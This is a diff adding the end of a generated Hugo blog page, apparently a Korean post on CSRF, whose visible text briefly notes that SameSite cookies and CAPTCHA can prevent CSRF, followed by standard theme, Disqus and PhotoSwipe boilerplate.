+<p>물론 Same-origin policy에 의존하지 않는 방법도 있다. Cookie에 samesite 보안 옵션을 추가하면 다른 Origin에서 보낸 HTTP 요청에는 Cookie가 같이 포함되지 않아 CSRF를 막을 수 있고, CAPTCHA 같이 유저 인터랙션을 강제하는 방법으로 막을 수도 있다.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "truealarm-github-io" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 True Alarm
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
